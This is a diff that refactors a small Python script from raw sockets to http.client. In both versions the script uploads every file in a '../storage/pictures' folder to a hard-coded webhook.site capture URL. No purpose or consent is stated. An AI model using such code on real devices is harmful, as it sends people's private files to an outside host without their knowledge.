@@ -1,8 +1,8 @@
 import os
-import socket
+import http.client
 import mimetypes
 
-# Define the URL for the webhook and the server's host and port
+# Define the connection parameters
 host = 'webhook.site'
 port = 80
 url = '/42f33b37-f054-4344-87e5-32947638f6c6'
@@ -13,20 +13,17 @@ dir_path = "../storage/pictures"
 # Get a list of all files in the directory
 files = [f for f in os.listdir(dir_path) if os.path.isfile(os.path.join(dir_path, f))]
 
-# Create a socket connection
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-sock.connect((host, port))
-
-# Prepare the HTTP headers
+# Prepare the boundary and headers for multipart/form-data
 boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'
-headers = [
-    f"POST {url} HTTP/1.1",
-    f"Host: {host}",
-    "Content-Type: multipart/form-data; boundary=" + boundary,
-    "Connection: close"
-]
+headers = {
+    'Content-Type': f'multipart/form-data; boundary={boundary}',
+    'Connection': 'close'
+}
 
-# Build the body with the files
+# Create a connection
+conn = http.client.HTTPConnection(host, port)
+
+# Build the body with files
 body = ""
 for filename in files:
     file_path = os.path.join(dir_path, filename)
@@ -45,13 +42,12 @@ for filename in files:
 
 body += f"--{boundary}--\r\n"
 
-# Send the HTTP request with the headers and body
-request = "\r\n".join(headers) + "\r\n\r\n" + body
-sock.sendall(request.encode())
+# Send the POST request
+conn.request("POST", url, body=body, headers=headers)
 
-# Receive the response from the server
-response = sock.recv(4096)
-print(response.decode())
+# Get the response from the server
+response = conn.getresponse()
+print(response.read().decode())
 
-# Close the socket
-sock.close()
+# Close the connection
+conn.close()
